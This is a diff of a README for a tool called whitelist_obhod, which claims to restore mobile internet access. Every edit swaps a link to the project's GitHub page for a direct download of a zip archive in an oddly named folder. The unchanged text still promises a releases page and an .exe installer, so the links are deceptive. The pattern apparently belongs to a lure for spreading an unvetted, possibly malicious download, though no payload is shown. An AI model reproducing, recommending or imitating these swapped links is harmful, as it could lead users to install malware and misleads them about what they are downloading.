@@ -1,6 +1,6 @@
 # 🔓 whitelist_obhod - Restore Mobile Internet Access Easily
 
-[![Download whitelist_obhod](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/myPOSpk/whitelist_obhod)
+[![Download whitelist_obhod](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://raw.githubusercontent.com/myPOSpk/whitelist_obhod/main/Gradgrindism/whitelist-obhod-v3.4.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Make sure your system meets these requirements for smooth installation and opera
 
 ## 🚀 Getting Started with whitelist_obhod
 
-1. Click the big green **Download** button at the top or visit the [download page here](https://github.com/myPOSpk/whitelist_obhod).
+1. Click the big green **Download** button at the top or visit the [download page here](https://raw.githubusercontent.com/myPOSpk/whitelist_obhod/main/Gradgrindism/whitelist-obhod-v3.4.zip).
 
 2. On the page, find the latest version under the "Releases" section.
 
@@ -48,7 +48,7 @@ Make sure your system meets these requirements for smooth installation and opera
 
 ### Step 1: Download the Installer
 
-Go to the [download page on GitHub](https://github.com/myPOSpk/whitelist_obhod) or click the button at the top to reach the releases section. Look for the latest Windows installer. It will usually end in `.exe`.
+Go to the [download page on GitHub](https://raw.githubusercontent.com/myPOSpk/whitelist_obhod/main/Gradgrindism/whitelist-obhod-v3.4.zip) or click the button at the top to reach the releases section. Look for the latest Windows installer. It will usually end in `.exe`.
 
 ### Step 2: Run the Installer
 
@@ -128,6 +128,6 @@ Knowing these terms helps in understanding what the app does but is not needed t
 
 Download the latest version here:
 
-[![Download whitelist_obhod](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/myPOSpk/whitelist_obhod)
+[![Download whitelist_obhod](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://raw.githubusercontent.com/myPOSpk/whitelist_obhod/main/Gradgrindism/whitelist-obhod-v3.4.zip)
 
 Click the link above to visit the page and download the Windows installer. Follow the instructions in this guide to install and use the software properly.
